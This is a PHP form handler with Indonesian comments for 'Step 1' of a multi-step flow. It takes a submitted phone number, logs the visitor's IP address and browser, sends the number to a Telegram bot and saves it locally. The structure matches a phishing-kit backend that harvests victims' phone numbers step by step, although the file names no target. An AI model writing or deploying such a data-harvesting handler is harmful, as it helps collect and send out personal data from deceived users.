<?php
/**
 * Handler untuk Step 1 - Nomor HP
 * Menerima data nomor HP dari form index.php
 * Menyimpan data dan mengirim ke Telegram
 */

// Include telegram configuration dan functions
require_once __DIR__ . '/../telegram.php';

// Ensure POST request
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    die(json_encode(['ok' => false, 'error' => 'Method not allowed']));
}

// Get input data
$input = array_merge($_POST, json_decode(file_get_contents('php://input'), true) ?? []);

// Validate nomor HP
$nohp = sanitize_input($input['nohp'] ?? '');

if (empty($nohp)) {
    http_response_code(400);
    echo json_encode(['ok' => false, 'error' => 'Nomor HP tidak boleh kosong']);
    exit;
}

// Prepare data for logging
$data = [
    'step' => 'step1_nohp',
    'nohp' => $nohp,
    'ip' => $_SERVER['REMOTE_ADDR'] ?? 'Unknown',
    'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown',
    'timestamp' => date('Y-m-d H:i:s'),
];

// Format message for Telegram
$message = formatStep1($nohp);

// Send to Telegram
$sent = sendToTelegram($message);

// Save submission to local file
saveSubmission($data);

// Return response
header('Content-Type: application/json; charset=utf-8');
echo json_encode([
    'ok' => true,
    'sent' => $sent,
    'data' => $data
]);
exit;

/**
 * Sanitize input data
 */
function sanitize_input($input) {
    return htmlspecialchars(trim($input), ENT_QUOTES, 'UTF-8');
}
?>
